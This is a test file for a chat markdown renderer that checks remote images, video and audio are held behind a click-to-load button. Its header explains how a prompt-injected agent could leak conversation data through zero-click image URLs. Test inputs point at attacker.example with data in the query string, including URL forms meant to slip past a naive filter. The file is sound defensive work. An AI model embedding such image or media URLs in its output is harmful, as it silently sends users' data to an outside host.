import { describe, it, expect } from 'vitest'
import { render, fireEvent } from '@testing-library/react'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import MarkdownRenderer from '../components/MarkdownRenderer'

/**
 * SECURITY GUARD — deferred remote images (rfc-redaction-explain-and-reveal §5).
 *
 * Agent-written markdown is untrusted, and an auto-loading
 * `<img src="https://…?d=<data>">` is a zero-click request: the browser sends
 * it the moment the message renders, so a prompt-injected agent can exfiltrate
 * conversation data through the URL with nobody clicking anything.
 *
 * By default, a remote http(s) image must render as a click-to-load
 * placeholder — NO `<img>` element, hence
 * no request — until the user explicitly clicks. Local images (`/api/file-raw`
 * same-origin reads) are unaffected: they make no outbound request, and
 * deferring them would only add friction to the dominant screenshot case.
 */

describe('deferRemoteImages', () => {
  it('a remote image renders a placeholder button, not an <img>', () => {
    const { container, getByText } = render(
      <MarkdownRenderer
        content={'![chart](https://evil.example.com/x.png?d=c2VjcmV0)'}
      />,
    )
    expect(container.querySelector('img')).toBeNull()
    const btn = container.querySelector('button')
    expect(btn).not.toBeNull()
    // The URL is duplicated in the title, but every approval fact is visible
    // in the button's rendered flow for keyboard and touch users.
    expect(btn!.getAttribute('title')).toBe('https://evil.example.com/x.png?d=c2VjcmV0')
    expect(getByText('Blocked for privacy — loads this from this site, one time.')).toBe(btn!.children[3])
    expect(getByText('Other external content stays blocked.')).toBe(btn!.children[4])
    expect(getByText('Described as: “chart”')).toBe(btn!.lastElementChild)
  })

  it('clicking the placeholder loads the image', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'![chart](https://example.com/chart.png)'}
      />,
    )
    fireEvent.click(container.querySelector('button')!)
    const img = container.querySelector('img') as HTMLImageElement | null
    expect(img).not.toBeNull()
    expect(img!.src).toBe('https://example.com/chart.png')
  })

  it('a local image still loads automatically under deferRemoteImages', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'![shot](/tmp/evidence/after.png)'}
      />,
    )
    const img = container.querySelector('img') as HTMLImageElement | null
    expect(img).not.toBeNull()
    expect(img!.getAttribute('src')).toContain('/api/file-raw')
  })

  it('a data image is stripped by the pre-existing markdown URL transform', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'![inline](data:image/png;base64,iVBORw0KGgo=)'}
      />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('button')).toBeNull()
  })

  it.each([
    ['absolute', `${window.location.origin}/api/link-meta?url=https://attacker.example/?d=secret`],
    ['root-relative', '/api/link-meta?url=https://attacker.example/?d=secret'],
    ['relative', 'api/link-meta?url=https://attacker.example/?d=secret'],
  ])('a same-origin %s gateway URL defers under deferRemoteImages', (_kind, src) => {
    const { container } = render(
      <MarkdownRenderer content={`![same origin proxy](${src})`} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('button')).not.toBeNull()
  })

  it('the local file-bytes route does not defer', () => {
    const { container } = render(
      <MarkdownRenderer content={'![local bytes](/api/file-raw?path=x.png)'} />,
    )
    const img = container.querySelector('img') as HTMLImageElement | null
    expect(img).not.toBeNull()
    expect(img!.getAttribute('src')).toBe('/api/file-raw?path=x.png')
    expect(container.querySelector('button')).toBeNull()
  })

  it('remote images defer by default', () => {
    const { container } = render(
      <MarkdownRenderer content={'![chart](https://example.com/chart.png)'} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('button')).not.toBeNull()
  })

  it('the destination host stays primary and alt text is a quoted secondary line', () => {
    const { container, getByText } = render(
      <MarkdownRenderer
        content={'![Quarterly chart](https://attacker.example/pixel?d=x)'}
      />,
    )
    const button = container.querySelector('button')!
    expect(button.textContent).toContain('attacker.example')
    const description = getByText('Described as: “Quarterly chart”')
    expect(description.classList).toContain('basis-full')
    expect(description.classList).toContain('text-muted')
    expect(button.getAttribute('title')).toBe('https://attacker.example/pixel?d=x')
  })

  it('omits the model-description line when alt text is absent', () => {
    const { container } = render(
      <MarkdownRenderer content={'![](https://attacker.example/pixel?d=x)'} />,
    )
    expect(container.querySelector('button')!.textContent).not.toContain('Described as:')
  })

  it.each([
    ['image', '![chart](https://attacker.example/pixel.png)', 'External image — click to load'],
    ['media', '<video controls src="https://attacker.example/video.mp4"></video>', 'External media — click to load'],
  ])('the deferred %s control is one wrapping button with visible safety facts', (_kind, content, label) => {
    const { container, getByText } = render(<MarkdownRenderer content={content} />)
    expect(container.querySelectorAll('button')).toHaveLength(1)
    const button = container.querySelector('button')!
    expect(button.classList).toContain('flex-wrap')
    const host = getByText('attacker.example')
    expect(host.classList).toContain('break-all')
    expect(host.classList).not.toContain('truncate')
    const action = getByText(label)
    // The action label is calm primary text at rest (never link-green, which in
    // this renderer means a hyperlink) and only hints the accent on hover — the
    // whole chip is the button, not a link.
    expect(action.classList).toContain('text-text')
    expect(action.classList).toContain('group-hover:text-accent')
    expect(action.classList).not.toContain('underline')
    const consequences = [
      getByText('Blocked for privacy — loads this from this site, one time.'),
      getByText('Other external content stays blocked.'),
    ]
    expect(button.getAttribute('title')).toBe(
      _kind === 'image'
        ? 'https://attacker.example/pixel.png'
        : 'https://attacker.example/video.mp4',
    )
    for (const consequence of consequences) {
      expect(consequence.classList).toContain('block')
      expect(consequence.classList).toContain('basis-full')
      expect(consequence.classList).toContain('text-muted')
    }
    for (const element of button.querySelectorAll('*')) {
      expect(element.classList).not.toContain('border-s')
      expect(element.classList).not.toContain('underline')
      expect(element.classList).not.toContain('decoration-dotted')
      expect(element.classList).not.toContain('min-w-0')
      expect(element.classList).not.toContain('truncate')
    }
  })

  it('approving a link-wrapped image does not navigate the link', () => {
    // [![alt](img)](href): the approval click must not fall through to the
    // (equally model-authored) anchor around it.
    const { container } = render(
      <MarkdownRenderer
        content={'[![chart](https://images.example/x.png)](https://attacker.example/landing)'}
      />,
    )
    const btn = container.querySelector('button')!
    // fireEvent returns false when preventDefault was called on the event.
    const notPrevented = fireEvent.click(btn)
    expect(notPrevented).toBe(false)
    expect(container.querySelector('img')).not.toBeNull()
  })

  it('a raw-HTML <video poster> defers like an image', () => {
    // The sanitizer's allowlist admits video/audio/source, whose poster/src
    // the browser fetches on mount — the same zero-click request the img
    // gate stops, so the same chip must gate it.
    const { container } = render(
      <MarkdownRenderer
        content={'<video controls poster="https://images.example/pixel?d=x" src="https://attacker.example/v.mp4"></video>'}
      />,
    )
    expect(container.querySelector('video')).toBeNull()
    const btn = container.querySelector('button')
    expect(btn).not.toBeNull()
    expect(btn!.textContent).toContain('attacker.example')
    expect(btn!.textContent).toContain('images.example')
    expect(btn!.textContent).toContain('Blocked for privacy — loads this from these sites, one time.')
    expect(btn!.textContent).toContain('Other external content stays blocked.')
    expect(btn!.querySelector('.lucide-film')).not.toBeNull()
    expect(btn!.getAttribute('title')).toBe(
      'https://attacker.example/v.mp4\nhttps://images.example/pixel?d=x',
    )
    fireEvent.click(btn!)
    expect(container.querySelector('video')).not.toBeNull()
  })

  it('a remote <source> outside an approved media element is dropped', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'<picture><source srcset="https://attacker.example/x.webp" type="image/webp"><img src="https://images.example/x.png" alt="pic"></picture>'}
      />,
    )
    expect(container.querySelector('source')).toBeNull()
    expect(container.querySelector('img')).toBeNull()
  })

  it('a bare remote <source src> is dropped too', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'<video controls><source src="https://attacker.example/v.mp4" type="video/mp4"></video>'}
      />,
    )
    expect(container.querySelector('video')).toBeNull()
    expect(container.querySelector('source')).toBeNull()
    expect(container.querySelector('button')).not.toBeNull()
  })

  it('a raw-HTML <audio src> defers like an image', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'<audio controls src="https://attacker.example/a.mp3"></audio>'}
      />,
    )
    expect(container.querySelector('audio')).toBeNull()
    const btn = container.querySelector('button')!
    expect(btn.querySelector('.lucide-volume-2')).not.toBeNull()
    expect(btn.textContent).toContain('Blocked for privacy — loads this from this site, one time.')
    fireEvent.click(btn)
    expect(container.querySelector('audio')).not.toBeNull()
  })

  it('a media description is visible and quoted without entering the host slot', () => {
    const { container, getByText } = render(
      <MarkdownRenderer
        content={'<audio controls title="Quarterly narration" src="https://attacker.example/a.mp3"></audio>'}
      />,
    )
    const button = container.querySelector('button')!
    expect(getByText('Described as: “Quarterly narration”').classList).toContain('text-muted')
    expect([...button.querySelectorAll('.break-all')].map(node => node.textContent)).toEqual(['attacker.example'])
    expect(button.getAttribute('title')).toBe('https://attacker.example/a.mp3')
  })

  it.each([
    ['mixed slash/backslash', 'https:/\\attacker.example/pixel'],
    ['protocol-relative', '//attacker.example/pixel'],
    ['slash-less special scheme', 'https:attacker.example/pixel'],
  ])('a %s poster URL is still classified remote', (_name, url) => {
    // The browser's URL parser normalizes all of these to a remote fetch of
    // attacker.example; the gate must classify with the SAME parser, or the
    // form the regex misses is exactly the form the exfiltration uses.
    const { container } = render(
      <MarkdownRenderer
        content={`<video controls poster="${url}"></video>`}
      />,
    )
    expect(container.querySelector('video')).toBeNull()
    expect(container.querySelector('button')).not.toBeNull()
  })

  it('one collected remote set drives every disclosed host and approval reset', () => {
    const first = '<video controls src="https://benign.example/v.mp4" poster="https://attacker.example/pixel.png"></video>'
    const second = '<video controls src="https://benign.example/v.mp4" poster="https://swapped.example/pixel.png"></video>'
    const { container, rerender } = render(<MarkdownRenderer content={first} />)
    let button = container.querySelector('button')!
    expect([...button.querySelectorAll('.break-all')].map(node => node.textContent)).toEqual([
      'benign.example',
      'attacker.example',
    ])
    expect(button.getAttribute('title')).toBe(
      'https://benign.example/v.mp4\nhttps://attacker.example/pixel.png',
    )

    fireEvent.click(button)
    expect(container.querySelector('video')).not.toBeNull()
    rerender(<MarkdownRenderer content={second} />)

    expect(container.querySelector('video')).toBeNull()
    button = container.querySelector('button')!
    expect([...button.querySelectorAll('.break-all')].map(node => node.textContent)).toEqual([
      'benign.example',
      'swapped.example',
    ])
  })

  it('the renderer exposes no remote-media deferral opt-out — no prop, no context', () => {
    const source = readFileSync(
      join(__dirname, '../components/MarkdownRenderer.tsx'),
      'utf8',
    )
    expect(source).not.toMatch(/\bdeferRemoteImages\b/)
    // Round 8: the context itself is deleted — deferral is unconditional
    // inline, so no future file can import a knob to consume.
    expect(source).not.toMatch(/\bDeferRemoteImagesCtx\b/)
  })

  it('media approval does not survive a URL swap at the same position', () => {
    // A streaming message re-renders in place, so React reuses the component
    // instance; approving URL X must not silently mount a swapped-in URL Y —
    // that would be the zero-click fetch the gate exists to stop.
    const { container, rerender } = render(
      <MarkdownRenderer
        content={'<video controls src="https://a.example/v.mp4"></video>'}
      />,
    )
    fireEvent.click(container.querySelector('button')!)
    expect(container.querySelector('video')).not.toBeNull()
    rerender(
      <MarkdownRenderer
        content={'<video controls src="https://b.example/v.mp4"></video>'}
      />,
    )
    expect(container.querySelector('video')).toBeNull()
    expect(container.querySelector('button')!.textContent).toContain('b.example')
  })
})
